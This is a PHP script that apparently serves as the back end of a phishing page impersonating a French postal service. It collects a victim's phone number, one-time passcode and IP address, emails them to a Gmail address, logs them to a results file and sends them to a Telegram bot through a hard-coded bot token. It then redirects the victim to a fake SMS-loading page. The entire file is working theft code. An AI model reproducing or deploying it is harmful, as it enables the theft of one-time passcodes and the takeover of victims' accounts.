<?php
session_start();

error_reporting(0);


$ip = getenv("REMOTE_ADDR");
$hostname = gethostbyaddr($ip);
	
	

	$subject  = "POSTAl [ OTP ] - ".$_SERVER['REMOTE_ADDR']."";
	$headers  = "From: postal <postal@SPYUS.ORG>\r\n";
	$message .= "Tel:   +33 •• •• •• ".$_SESSION['Stelesx']."\n";
    $message .= "OTP:  ".$_POST['OTP']."\n"; 
	$message .= "IP :   $ip | $hostname\n";

	
	$to = "boxmedia34@gmail.com";


	

	mail($to, $subject, $message, $headers);

	
$Txt_Rezlt = fopen('../rzlt.txt', 'a+');
fwrite($Txt_Rezlt, $message);
fclose($Txt_Rezlt);

$token = "1382145052:AAGsO00WvsBBNfT5ALBEX8h0JLx8XrYpUpg";

file_get_contents("https://api.telegram.org/bot$token/sendMessage?chat_id=1239437517&text=" . urlencode($message)."" );





		header('location: loadingsms.html');




?>



